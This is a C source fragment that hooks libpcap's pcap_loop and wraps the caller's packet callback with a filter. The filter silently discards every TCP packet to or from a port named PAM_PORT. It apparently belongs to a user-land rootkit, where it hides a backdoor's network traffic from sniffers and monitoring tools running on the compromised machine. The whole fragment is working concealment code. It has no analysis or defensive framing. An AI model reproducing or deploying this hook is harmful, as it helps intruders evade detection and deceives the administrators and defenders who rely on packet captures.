void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;
    int size_ip, size_tcp, sport, dport;

    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    if(size_ip < 20) return;

    switch(ip->ip_p)
    {
        case IPPROTO_TCP:
            break;
        default:
            if(o_callback) o_callback(args, header, packet);
            return;
    }

    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    if(size_tcp < 20) return;

    sport = htons(tcp->th_sport);
    dport = htons(tcp->th_dport);

    if(sport == PAM_PORT || dport == PAM_PORT) return;
    else if(o_callback) o_callback(args, header, packet);
}

int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
{
    o_callback = callback;
    HOOK(o_pcap_loop, CPCAP_LOOP);
    return o_pcap_loop(p, cnt, got_packet, user);
}